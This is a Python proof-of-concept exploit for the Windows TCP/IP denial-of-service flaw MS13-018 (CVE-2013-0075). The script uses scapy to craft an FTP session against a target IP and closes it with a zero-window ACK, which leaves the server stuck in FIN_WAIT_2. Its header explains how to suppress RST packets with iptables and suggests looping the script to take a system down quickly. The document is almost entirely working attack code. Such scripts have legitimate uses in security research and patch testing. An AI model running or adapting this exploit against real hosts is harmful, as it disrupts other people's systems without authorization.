#!/usr/bin/python

#Exploit Title: MS13-018 TCP FIN WAIT DoS PoC
#Date: 8th April 2013
#MS Vulnerability Announcement: http://technet.microsoft.com/en-us/security/bulletin/ms13-018
#CVE: 2013-0075
#Exploit Author: Stephen Sims
#Vendor Homepage: http://www.microsoft.com
#Version: 1.0               
#Tested against: Windows 7 and Windows 8
#Solution: Apply the patch
#Screenshot: http://deadlisting.com/images/ms13_018_screenshot.png
#
#A denial of service vulnerability exists in the Windows TCP/IP stack that could cause the target 
#system to stop responding and automatically restart. The vulnerability is caused when the TCP/IP 
#stack improperly handles a connection termination sequence.
#
#This version written for FTP servers, modify for other protocols. Some systems stay in FIN_WAIT_2 
#state indefinitely. 
#
#You must suppress the RST from your system with iptables
#e.g. iptables -A OUTPUT -p tcp --destination-port 21 --tcp-flags RST RST -s x.x.x.x -d y.y.y.y -j DROP
#You must have scapy installed...
#
#Wrap it in a loop and change the sleep timer to quickly DoS a system. 

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from time import sleep
import sys
conf.verb = 0

SPORT= RandNum(1024, 65535)
my_seq = 1000

if len(sys.argv) != 4:
    sys.stderr.write('\nUsage: [IP] [username] [password] \n\n')
    sys.exit(1)

DSTIP= str(sys.argv[1])
USER = "USER " + str(sys.argv[2]) + "\r\n"
PASS = "PASS " + str(sys.argv[3]) + "\r\n"
QUIT = "quit\r\n"

print "\nRunning MS13-018 DoS - TCP FIN WAIT Attack Script..."

ip=IP(dst=DSTIP, flags="DF", ttl=64)
SYN=TCP(sport=SPORT, dport=21, flags="S", seq=my_seq, window=0xffff)
SYNACK=sr1(ip/SYN)       # Send the packet and record the response as SYNACK
SPORT2=SYNACK.dport
sleep(.1) #Sleep is used for timing. Some servers get weird if too fast.

my_seq = my_seq + 1
my_ack = SYNACK.seq + 1  # Use the SYN/ACK response to get ISN 
ACK=TCP(sport=SPORT2, dport=21, flags="A", seq=my_seq, ack=my_ack, window=0xffff)
derp = sr1(ip/ACK)  #Send 3rd part of 3-way handshake and receive FTP MSG
sleep(.1)

my_ack = derp.seq + (derp[IP].len - (derp[IP].ihl * 4) - (derp[TCP].dataofs * 4))
ACK=TCP(sport=SPORT2, dport=21, flags="A", seq=my_seq, ack=my_ack, window=0xffff)
send(ip/ACK)
sleep(.1)

my_ack = derp.seq + (derp[IP].len - (derp[IP].ihl * 4) - (derp[TCP].dataofs * 4))
data = USER  #FTP USER command
PUSH=TCP(sport=SPORT2,dport=21, flags="PA", seq=my_seq, ack=my_ack, window=0xffff)
derp = sr1(ip/PUSH/data) 
sleep(.1)

my_seq = my_seq + len(USER)
my_ack = derp.seq + (derp[IP].len - (derp[IP].ihl * 4) - (derp[TCP].dataofs * 4))
data = PASS #FTP PASS command
PUSH=TCP(sport=SPORT2,dport=21, flags="PA", seq=my_seq, ack=my_ack, window=0xffff)
derp = sr1(ip/PUSH/data) 
sleep(.1)

my_seq = my_seq + len(PASS)
my_ack = derp.seq + (derp[IP].len - (derp[IP].ihl * 4) - (derp[TCP].dataofs * 4))
PUSH=TCP(sport=SPORT2,dport=21, flags="PA", seq=my_seq, ack=my_ack, window=0xffff)
data = QUIT #QUIT command to get server to send FIN ACK
derp = sr1(ip/PUSH/data)
sleep(.1)

my_seq = my_seq + len(QUIT)
my_ack = derp.seq + (derp[IP].len - (derp[IP].ihl * 4) - (derp[TCP].dataofs * 4) + 1)
FIN=TCP(sport=SPORT2,dport=21, flags="A", seq=my_seq, ack=my_ack, window=0x0) #Setting Window size to 0
send(ip/FIN)  # Server should be in FIN_WAIT_2 state for a long time, if not indefinitely... 

print "\nCheck TCP state on " + DSTIP + ", Port: " + str(SPORT2) + ". Should be in FIN_WAIT_2 state.\n"


